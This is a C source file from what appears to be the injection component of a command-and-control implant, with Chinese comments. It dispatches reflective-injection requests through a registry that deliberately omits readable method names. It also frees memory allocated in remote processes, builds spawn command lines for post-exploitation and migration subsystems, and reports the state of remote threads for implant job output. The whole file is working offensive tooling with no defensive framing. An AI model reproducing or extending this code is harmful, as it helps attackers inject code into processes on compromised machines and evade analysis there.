#include "beacon_inject.h"
#include "inject_internal.h"

typedef struct InjectMethodEntry {
    UINT32 id;
    InjectMethodHandler handler;
} InjectMethodEntry;

/* 注入方法注册表：只保存数值 ID 和函数指针，不携带可读名称。 */
static const InjectMethodEntry g_inject_methods[] = {
    { INJECT_METHOD_REFLECTIVE, InjectPrepareReflective }
};

/* 初始化注入结果，便于调用方在失败路径统一清理。 */
VOID InjectResultInit(InjectResult* result)
{
    if (!result) return;
    ZeroMemory(result, sizeof(*result));
}

/* 释放本次注入准备阶段分配的远程内存。 */
VOID InjectFreeRemote(HANDLE process, InjectResult* result)
{
    if (!process || !result) return;

    if (result->remote_parameter) {
        VirtualFreeEx(process, result->remote_parameter, 0, MEM_RELEASE);
        result->remote_parameter = NULL;
        result->remote_parameter_size = 0;
    }
    if (result->remote_image) {
        VirtualFreeEx(process, result->remote_image, 0, MEM_RELEASE);
        result->remote_image = NULL;
        result->remote_image_size = 0;
    }
    result->remote_entry = NULL;
}

/* 按 method id 查找注入实现，避免 switch 随方法数增长。 */
static const InjectMethodEntry* InjectMethodFind(UINT32 method)
{
    SIZE_T i;
    for (i = 0; i < sizeof(g_inject_methods) / sizeof(g_inject_methods[0]); i++) {
        if (g_inject_methods[i].id == method) return &g_inject_methods[i];
    }
    return NULL;
}

/* 注入准备总入口：校验请求并分发到具体 method handler。 */
BOOL InjectPrepare(const InjectRequest* req,
                   InjectResult* result,
                   CHAR* err,
                   SIZE_T err_size)
{
    const InjectMethodEntry* entry;

    if (result) InjectResultInit(result);
    if (err && err_size) err[0] = '\0';

    if (!req) {
        if (err) strcpy_s(err, err_size, "invalid inject request");
        return FALSE;
    }

    entry = InjectMethodFind(req->method);
    if (!entry) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "inject method %lu not registered",
                             (ULONG)req->method);
        return FALSE;
    }

    return entry->handler(req, result, err, err_size);
}

/* ===== 跨子系统共用工具（postex_backend / migrate_backend 调用） ===== */

/* 构造 spawn 命令行，保留 exe 路径引号以兼容空格路径。 */
BOOL InjectBuildSpawnCommandLine(const CHAR* exe_path,
                                 const CHAR* args,
                                 CHAR* out,
                                 SIZE_T out_size)
{
    if (!exe_path || !exe_path[0] || !out || out_size == 0) return FALSE;
    if (args && args[0]) {
        return _snprintf_s(out, out_size, _TRUNCATE,
                           "\"%s\" %s", exe_path, args) > 0;
    }
    return _snprintf_s(out, out_size, _TRUNCATE,
                       "\"%s\"", exe_path) > 0;
}

/* 格式化远程线程即时状态，用于 job/status 输出和失败诊断。 */
VOID InjectFormatRemoteThreadStatus(HANDLE thread, CHAR* out, SIZE_T out_size)
{
    DWORD wait_rc;
    DWORD exit_code = 0;

    if (!out || out_size == 0) return;
    out[0] = '\0';
    if (!thread) {
        strcpy_s(out, out_size, "remote_thread=null");
        return;
    }

    wait_rc = WaitForSingleObject(thread, 0);
    if (wait_rc == WAIT_TIMEOUT) {
        strcpy_s(out, out_size, "remote_thread=running");
        return;
    }
    if (wait_rc == WAIT_OBJECT_0) {
        if (GetExitCodeThread(thread, &exit_code)) {
            _snprintf_s(out, out_size, _TRUNCATE,
                        "remote_thread=exited:0x%08lx",
                        (ULONG)exit_code);
        } else {
            _snprintf_s(out, out_size, _TRUNCATE,
                        "remote_thread=exited:GetExitCodeThread failed:%lu",
                        (ULONG)GetLastError());
        }
        return;
    }

    _snprintf_s(out, out_size, _TRUNCATE,
                "remote_thread=wait_failed:%lu",
                (ULONG)GetLastError());
}
